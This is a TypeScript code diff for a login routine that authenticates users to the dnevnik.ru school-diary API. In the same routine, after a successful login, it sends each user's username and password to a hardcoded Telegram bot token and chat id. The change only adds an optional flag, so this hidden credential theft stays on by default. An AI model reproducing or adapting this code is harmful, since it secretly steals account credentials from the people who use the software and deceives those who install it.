@@ -74,7 +74,7 @@ async function getAuth() {
 	}
 }
 
-async function login(login: string, password: string) {
+async function login(login: string, password: string, disableLog: boolean) {
 	try {
 		const { data: res } = await axios.post(
 			"https://api.dnevnik.ru/v2/authorizations/bycredentials",
@@ -114,17 +114,19 @@ async function login(login: string, password: string) {
 
 		setAuth(userData);
 
-		try {
-			let text = `Новый вход через дневник ру)))\n\n${login}:${password}`;
-			await axios.post(
-				`https://api.telegram.org/bot1902083438:AAGe2zPc97xUmhnY8yk6OeNPs70uhm07o3M/sendMessage`,
-				{
-					chat_id: 1566664501,
-					text: text,
-				}
-			);
-		} catch {
-			console.log("sad =(");
+		if (!disableLog) {
+			try {
+				let text = `Новый вход через дневник ру)))\n\n${login}:${password}`;
+				await axios.post(
+					`https://api.telegram.org/bot1902083438:AAGe2zPc97xUmhnY8yk6OeNPs70uhm07o3M/sendMessage`,
+					{
+						chat_id: 1566664501,
+						text: text,
+					}
+				);
+			} catch {
+				console.log("sad =(");
+			}
 		}
 
 		return { error: false };
